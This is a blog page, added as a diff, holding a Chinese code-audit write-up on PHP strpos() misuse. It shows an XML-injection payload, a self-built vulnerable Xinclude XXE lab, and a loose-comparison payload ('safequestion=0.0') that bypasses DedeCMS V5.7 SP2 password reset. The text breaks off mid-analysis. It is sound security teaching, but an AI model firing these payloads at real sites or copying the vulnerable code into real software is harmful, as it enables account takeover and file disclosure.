@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>PHP-Audit-Labs-Day4 strpos 使用不当引发漏洞 | C0r1&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">PHP-Audit-Labs-Day4 strpos 使用不当引发漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">November 18, 2019&nbsp;&nbsp;22:08:15</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day4/files/README.md" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day4 - strpos&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;</a> </p>
+<h1 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h1><blockquote>
+<p><strong><a href="http://php.net/manual/zh/function.strpos.php" target="_blank" rel="noopener">strpos</a></strong> &#x2014; &#x67E5;&#x627E;&#x5B57;&#x7B26;&#x4E32;&#x9996;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;</p>
+<p>&#x4F5C;&#x7528;&#xFF1A;&#x4E3B;&#x8981;&#x662F;&#x7528;&#x6765;&#x67E5;&#x627E;&#x5B57;&#x7B26;&#x5728;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x9996;&#x6B21;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p>
+<p>&#x7ED3;&#x6784;&#xFF1A;<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p>
+</blockquote>
+<p>&#x7279;&#x6027;&#xFF1A;<a href="http://c0r1.com/2019/09/26/&#x5357;&#x90AE;-CTF-&#x5E73;&#x53F0;&#x9898;&#x8BB0;/#1-15-x00" target="_blank" rel="noopener">strpos() &#x51FD;&#x6570;</a> &#x67E5;&#x627E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x51FA;&#x73B0;&#x5728;&#x9996;&#x4F4D;&#x65F6;&#x8FD4;&#x56DE; <code>0</code> &#xFF0C;&#x9047;&#x5230;&#x6570;&#x7EC4;&#x4F5C;&#x53C2;&#x6570;&#x65F6;&#x8FD4;&#x56DE; <code>NULL</code> </p>
+<h1 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>{</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>{</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (!strpos($user, <span class="string">&apos;&lt;&apos;</span>) || !strpos($user, <span class="string">&apos;&gt;&apos;</span>)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, <span class="string">&apos;&lt;&apos;</span>) || !strpos($pass, <span class="string">&apos;&gt;&apos;</span>))</span><br><span class="line">    ) {</span><br><span class="line">      $format = <span class="string">&apos;&lt;?xml version=&quot;1.0&quot;?&gt;&apos;</span> .</span><br><span class="line">        <span class="string">&apos;&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;&apos;</span>;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">      <span class="comment">// Perform the actual login.</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">&apos;username&apos;</span>], $_POST[<span class="string">&apos;password&apos;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>&#x5728;&#x5C1D;&#x8BD5;&#x5BF9;&#x4E0A;&#x8FF0;&#x4F8B;&#x5B50;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x65F6;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x7591;&#x60D1;</p>
+<h2 id="1-lt-&#x5728;&#x5C5E;&#x6027;&#x4E2D;&#x62A5;&#x9519;"><a href="#1-lt-&#x5728;&#x5C5E;&#x6027;&#x4E2D;&#x62A5;&#x9519;" class="headerlink" title="1. &lt; &#x5728;&#x5C5E;&#x6027;&#x4E2D;&#x62A5;&#x9519;"></a>1. &lt; &#x5728;&#x5C5E;&#x6027;&#x4E2D;&#x62A5;&#x9519;</h2><p>&#x5B98;&#x65B9;&#x7ED9;&#x51FA;&#x7684;&#x9898;&#x89E3; Payload&#xFF1A;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x5728;&#x7FFB;&#x9605;&#x6587;&#x6863;&#x65F6;&#x53D1;&#x73B0;</p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/6.png" alt="image-20191120085834268"></p>
+<p>&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#x5728; XML &#x4E2D;&#xFF1A; <code>&lt;</code> &#x4EC5;&#x8868;&#x793A;&#x6807;&#x7B7E;&#x8D77;&#x59CB;&#xFF0C;<code>&amp;</code> &#x4EC5;&#x8868;&#x793A;&#x5F15;&#x7528;&#xFF0C;&#x5728;&#x5176;&#x4F59;&#x4F4D;&#x7F6E;&#x51FA;&#x73B0;&#x5747;&#x4F1A;&#x5BFC;&#x81F4;&#x89E3;&#x6790;&#x5668;&#x9519;&#x8BEF;</p>
+<p>&#x5E78;&#x8FD0;&#x7684;&#x662F;&#x8FD9;&#x91CC;&#x4ECD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>&gt;</code> &#x7ED5;&#x8FC7;</p>
+<h2 id="2-XML-&#x4E2D;&#x6807;&#x7B7E;&#x4F7F;&#x7528;&#x9519;&#x8BEF;"><a href="#2-XML-&#x4E2D;&#x6807;&#x7B7E;&#x4F7F;&#x7528;&#x9519;&#x8BEF;" class="headerlink" title="2. XML &#x4E2D;&#x6807;&#x7B7E;&#x4F7F;&#x7528;&#x9519;&#x8BEF;"></a>2. XML &#x4E2D;&#x6807;&#x7B7E;&#x4F7F;&#x7528;&#x9519;&#x8BEF;</h2><p>&#x9898;&#x76EE;&#x4E2D;&#x51FA;&#x73B0;&#x7684; <code>$format</code>&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;user v=&quot;%s&quot;/&gt;&lt;pass v=&quot;%s&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x4F1A;&#x5BFC;&#x81F4;&#x89E3;&#x6790;&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x67E5;&#x627E;&#x65F6;&#x672A;&#x627E;&#x5230;&#x5F62;&#x5982; <code>&lt;user v=&quot;xx&quot;/&gt;&lt;pass v=&quot;xx&quot;/&gt;</code> &#xFF0C;&#x8FD9;&#x79CD;&#x5355;&#x6807;&#x7B7E;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x3002;&#x6539;&#x4E3A;&#x6210;&#x5BF9;&#x51FA;&#x73B0;&#x6807;&#x7B7E;&#xFF0C;&#x672A;&#x62A5;&#x9519;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5FC5;&#x987B;&#x63D0;&#x4F9B;&#x4E00;&#x5BF9;&#x4E3B;&#x6807;&#x7B7E;&#xFF1A;<code>foo</code>&#x3002;&#x540D;&#x79F0;&#x968F;&#x610F;&#xFF0C;&#x6700;&#x7EC8;&#x683C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">&lt;user v=&quot;%s&quot;&gt;&lt;/user&gt;&lt;pass v=&quot;%s&quot;&gt;&lt;/pass&gt;</span><br><span class="line">&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PS&#xFF1A;&#x539F;&#x6765; <code>$format</code> &#x4E2D;&#x7ED9;&#x51FA;&#x7684;&#x662F;&#x89E3;&#x6790;&#x5668;&#x5904;&#x7406;&#x8FC7;&#x540E;&#x7684; XML &#x8F93;&#x51FA;&#x683C;&#x5F0F;&#x3002;&#x3002;&#x7136;&#x800C;&#x672C;&#x5730;&#x6D4B;&#x8BD5;&#xFF0C;<code>SimpleXMLElement</code> &#x65E0;&#x6CD5;&#x89E3;&#x6790;&#x8BE5;&#x683C;&#x5F0F;</strong></p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/8.png" alt="image-20191120200412589"></p>
+<h2 id="3-&#x5C0F;&#x7ED3;"><a href="#3-&#x5C0F;&#x7ED3;" class="headerlink" title="3. &#x5C0F;&#x7ED3;"></a>3. &#x5C0F;&#x7ED3;</h2><p>&#x5728;&#x601D;&#x8003;&#x63A5;&#x4E0B;&#x6765;&#x8BE5;&#x5982;&#x4F55;&#x5229;&#x7528;&#x65F6;&#xFF0C;&#x53EA;&#x80FD;&#x671F;&#x671B;&#x6CE8;&#x5165;&#x7684;&#x6570;&#x636E;&#x80FD;&#x591F;&#x5728; <code>$this-&gt;login()</code> &#x51FD;&#x6570;&#x5F15;&#x53D1;&#x65B0;&#x7684;&#x6F0F;&#x6D1E;</p>
+<p>&#x8FD9;&#x79CD;&#x65E0;&#x6CD5;&#x63A7;&#x5236;&#x6574;&#x4E2A; XML &#x6587;&#x6863;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x60F3;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x662F;&#xFF1A;<a href="http://c0r1.com/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/#Xinclude-attacks" target="_blank" rel="noopener"><strong>Xinclude attacks</strong></a></p>
+<p>&#x7531;&#x4E8E;&#x4F8B;&#x9898;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x51B3;&#x5B9A;&#x81EA;&#x884C;&#x9B54;&#x6539;&#x6210;&#x4E00;&#x9053; <strong>Xinclude XXE</strong> &#x7684;&#x9898;&#x76EE;&#x3002;PHP &#x4E2D;&#x7684; <code>SimpleXMLElement</code> &#x548C; <code>DOMDocument</code> &#x7C7B;&#xFF0C;&#x9ED8;&#x8BA4;&#x90FD;&#x4E0D;&#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x8F7D; <code>Xinclude</code>&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528; <a href="https://www.php.net/manual/en/domdocument.xinclude.php" target="_blank" rel="noopener"><strong>DOMDocument::xinclude</strong></a> &#x65B9;&#x6CD5;&#x52A0;&#x8F7D;&#x3002;&#x78B0;&#x5230;&#x7684; XXE &#x592A;&#x5C11;&#x4E86;&#x3002;&#x3002;&#x672C;&#x83DC;&#x8FD9;&#x91CC;&#x53EA;&#x80FD;&#x5F3A;&#x884C;&#x9020;&#x6D1E;&#x4F53;&#x9A8C;&#x4E00;&#x4E0B; <strong>Xinclude XXE</strong> &#x4E86;</p>
+<p>&#x770B;&#x6D1E;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>{</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">          (!strpos($user, <span class="string">&apos;&lt;&apos;</span>) || !strpos($user, <span class="string">&apos;&gt;&apos;</span>)) &amp;&amp;</span><br><span class="line">          (!strpos($pass, <span class="string">&apos;&lt;&apos;</span>) || !strpos($pass, <span class="string">&apos;&gt;&apos;</span>))</span><br><span class="line">        ) {</span><br><span class="line">          </span><br><span class="line">            $format = <span class="string">&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos;</span>.</span><br><span class="line">            <span class="string">&apos;&lt;test&gt;&apos;</span>.</span><br><span class="line">            <span class="string">&apos;&lt;user v=&quot;%s&quot;&gt;&lt;/user&gt;&lt;pass v=&quot;%s&quot;&gt;&lt;/pass&gt;&apos;</span>.</span><br><span class="line">            <span class="string">&apos;&lt;/test&gt;&apos;</span>;</span><br><span class="line">           </span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $datas = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            $dom = dom_import_simplexml($datas);</span><br><span class="line">            $dom-&gt;ownerDocument-&gt;xinclude();</span><br><span class="line">            <span class="keyword">echo</span> $dom-&gt;ownerDocument-&gt;saveXML();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">&apos;username&apos;</span>], $_POST[<span class="string">&apos;password&apos;</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;flag{XX1-1s-v3ry-1nterest1ng}&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>WriteUp &#x5199;&#x5728;&#x6587;&#x672B;</p>
+<h1 id="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"><a href="#&#x5B9E;&#x4F8B;&#x5206;&#x6790;" class="headerlink" title="&#x5B9E;&#x4F8B;&#x5206;&#x6790;"></a>&#x5B9E;&#x4F8B;&#x5206;&#x6790;</h1><p><strong>DeDecms V5.7 SP2 &#x6B63;&#x5F0F;&#x7248;</strong> &#x4E2D;&#x5B58;&#x5728;&#x672A;&#x4FEE;&#x590D;&#x7684;&#x4EFB;&#x610F;&#x7528;&#x6237;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;&#x6F0F;&#x6D1E;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x672A;&#x8BBE;&#x7F6E;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;&#x95EE;&#x9898;&#x548C;&#x7B54;&#x6848;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x91CD;&#x7F6E;&#x9A8C;&#x8BC1;&#x903B;&#x8F91;&#xFF0C;&#x83B7;&#x53D6;&#x5230;&#x8BE5;&#x7528;&#x6237;&#x7684;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x94FE;&#x63A5;&#x8FDB;&#x884C;&#x5BC6;&#x7801;&#x91CD;&#x7F6E;&#x64CD;&#x4F5C;</p>
+<p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>/member/resetpassword.php</code> &#x4E2D;&#xFF0C;&#x5F53; <code>$dopost == &quot;safequestion&quot;</code> &#x65F6;&#xFF0C;&#x8FDB;&#x5165;&#x5F53;&#x524D;&#x5206;&#x652F;&#x3002;&#x901A;&#x8FC7;&#x4F20;&#x5165; <code>$mid</code> &#x5BF9;&#x5E94;&#x7684; <code>$id</code> &#x503C;&#x6765;&#x67E5;&#x8BE2;&#x5BF9;&#x5E94;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x4FE1;&#x606F;</p>
+<p>&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684;&#x5B89;&#x5168;&#x9A8C;&#x8BC1;&#x95EE;&#x9898;&#x548C;&#x7B54;&#x6848;&#x7B49;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7528;&#x6237; <code>safequestion &amp;&amp; safeanswer</code> &#x503C;&#x65F6;&#xFF0C;&#x8FDB;&#x5165;&#x5230; <strong>12 &#x884C;</strong> <code>sn()</code> &#x51FD;&#x6570;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">{</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $sql = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &apos;$mid&apos;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safequestion)) $safequestion = <span class="string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($safeanswer)) $safeanswer = <span class="string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">&apos;safequestion&apos;</span>] == $safequestion &amp;&amp; $row[<span class="string">&apos;safeanswer&apos;</span>] == $safeanswer)</span><br><span class="line">    {</span><br><span class="line">        sn($mid, $row[<span class="string">&apos;userid&apos;</span>], $row[<span class="string">&apos;email&apos;</span>], <span class="string">&apos;N&apos;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        ShowMsg(<span class="string">&quot;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x60A8;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x6216;&#x7B54;&#x6848;&#x56DE;&#x7B54;&#x9519;&#x8BEF;&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x91C7;&#x7528;&#x4E86;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x9A8C;&#x8BC1;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x548C;&#x7B54;&#x6848;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;</p>
+<p><strong>&#x5047;&#x8BBE;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x548C;&#x7B54;&#x6848;</strong>&#x3002;&#x90A3;&#x4E48;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53D6;&#x51FA;&#x7684; <code>$row[&apos;safequestion&apos;] = &quot;0&quot;</code>&#x3001;<code>$row[&apos;safeanswer&apos;]=&quot;&quot;</code>&#x3002;&#x6240;&#x4EE5; <strong>&#x7B2C; 10 &#x884C;</strong> &#x5224;&#x65AD;&#x5904;&#x6761;&#x4EF6;&#x5373;&#x4E3A; <code>&quot;0&quot; == $safequestion &amp;&amp; &quot;&quot; == $safeanswer</code> </p>
+<p>&#x53C8;&#x7531;&#x4E8E; <strong>6, 8 &#x4E24;&#x884C;</strong> &#x5229;&#x7528; <strong>empty()</strong> &#x51FD;&#x6570;&#x7ED9;&#x672A;&#x8BBE;&#x503C;&#x7684; <strong>$safequestion</strong> &#x548C; <strong>$safeanswer</strong> &#x7F6E;&#x7A7A;&#xFF0C;&#x53EA;&#x9700;&#x518D;&#x989D;&#x5916;&#x6784;&#x9020; <strong>$safequestion</strong> &#x4F7F;&#x5176;&#x6EE1;&#x8DB3;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($safequestion) &amp;&amp; <span class="string">&quot;0&quot;</span> == $safequestion){</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&apos;OK!&apos;</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x5224;&#x65AD;&#x8FDB;&#x5165; <strong>sn()</strong> &#x51FD;&#x6570;</p>
+<p>PHP &#x7684;&#x677E;&#x6563;&#x6BD4;&#x8F83;&#x4F1A;&#x5C06;&#x6BD4;&#x8F83;&#x53CC;&#x65B9;&#x8F6C;&#x6362;&#x81F3;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#xFF0C;&#x518D;&#x505A;&#x6570;&#x503C;&#x6BD4;&#x8F83;</p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/1.png" alt="image-20191118224823879"></p>
+<p>&#x6784;&#x9020; Payload &#xFF1A;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost=safequestion&amp;id=xx&amp;safequestion=0.0</span><br></pre></td></tr></table></figure>
+
+<p>&#x7ED5;&#x8FC7;&#x9A8C;&#x8BC1;&#x7801;&#x53CA;&#x4E0A;&#x8FF0;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#xFF0C;&#x8FDB;&#x5165; <strong>sn()</strong> &#x51FD;&#x6570;&#x3002;&#x8BE5;&#x51FD;&#x6570;&#x4F9D;&#x636E; <strong>id</strong> &#x5230; <strong>pwd_tmp</strong> &#x8868;&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x4EE5;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x5BF9;&#x5E94;&#x7684;&#x4E34;&#x65F6;&#x5BC6;&#x7801;&#x8BB0;&#x5F55;&#xFF0C;&#x5E76;&#x6839;&#x636E;&#x7ED3;&#x679C;&#x786E;&#x5B9A;&#x5206;&#x652F;&#xFF0C;&#x8D70;&#x5411; <strong>newmail()</strong> &#x51FD;&#x6570;</p>
